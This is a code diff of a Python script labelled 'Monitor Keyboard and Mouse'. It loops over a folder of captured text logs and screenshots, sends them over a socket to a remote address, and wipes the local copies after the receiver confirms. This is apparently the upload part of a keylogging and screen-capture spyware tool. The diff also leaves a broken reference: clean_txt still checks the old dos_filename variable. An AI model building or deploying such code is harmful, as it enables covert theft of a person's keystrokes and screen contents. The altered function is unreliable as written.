@@ -9,14 +9,10 @@ contact: QQ<--2472674814-->  Email<--EternalNight996@gmail.com-->
 describe: Monitor Keyboard and Mouse
 current application version: 1.0
 """
-
 import os, time
-import gevent
 import threading
+import socket
 #import multiprocessing
-from gevent import socket
-from gevent import monkey;monkey.patch_all()
-
 def monitor(pathlist, ADDRlist):
     while True:
         isdir=os.path.exists(pathlist['dos_pic_dir'])
@@ -37,8 +33,8 @@ def monitor(pathlist, ADDRlist):
                 pathlist['pic_save_to'],pathlist['pic_name']='',''
         time.sleep(1)
 
-def clean_txt(dos_filename):
-    os.system('type nul >%s' %dos_filename)
+def clean_txt(open_filename):
+    f=open(open_filename, 'w').close()
     if not os.path.getsize(dos_filename):
         return True
     else:
@@ -62,7 +58,7 @@ def open_deal(open_filename):
         f.close()
         return msg
 
-def sendfile(data, dos_filename, pic_save_to, set_code, BUFSIZE, clientSocket):
+def sendfile(data, open_filename, pic_save_to, set_code, BUFSIZE, clientSocket):
     i=0
     total=len(data)
     while i<total:
@@ -72,10 +68,10 @@ def sendfile(data, dos_filename, pic_save_to, set_code, BUFSIZE, clientSocket):
     reply=clientSocket.recv(BUFSIZE)
     if 'txt done'==reply.decode(set_code):
         print('接收',reply.decode(set_code))
-        if clean_txt(dos_filename):
-            print('成功清理{}文件'.format(dos_filename))
+        if clean_txt(open_filename):
+            print('成功清理{}文件'.format(open_filename))
         else:
-            print('无法清除{}文件'.format(dos_filename))
+            print('无法清除{}文件'.format(open_filename))
     elif 'pic done'==reply.decode(set_code):
         print('接收', reply.decode(set_code))
         if clean_pic(pic_save_to):
@@ -110,7 +106,7 @@ def handle(pathlist, ADDRlist):
         data=confirm('txt', pathlist['open_filename'],
                 None, ADDRlist['set_code'], ADDRlist['txtSIZE'], ADDRlist['clientSocket'])
         if data:
-            sendfile(data, pathlist['dos_filename'], None,
+            sendfile(data, pathlist['open_filename'], None,
                     ADDRlist['set_code'], ADDRlist['txtSIZE'], ADDRlist['clientSocket'])
         else:
             print('数据错误')
@@ -196,17 +192,11 @@ def init_setting():
         else:
             print('无法找到配置文件和目录')
         if not os.path.exists(pathlist['dos_pic_dir']):
-            try:
-                os.makedirs(pathlist['dos_pic_dir'])
-                print('正在生成%s目录' %pathlist['dos_pic_dir'])
-            except:
-                print('error>>%s' %pathlist['dos_pic_dir'])
+            os.makedirs(pathlist['dos_pic_dir'])
+            print('正在生成%s目录' %pathlist['dos_pic_dir'])
         if not os.path.exists(pathlist['dos_filename']):
-            try:
-                os.system('type nul >%s' %pathlist['dos_filename'])
-                print('正在生成%s' %pathlist['dos_filename'])
-            except:
-                print('error>>%s' %pathlist['dos_filename'])
+            open(pathlist['open_filename'], 'w').close()
+            print('正在生成%s' %pathlist['open_filename'])
 
 
 def main():
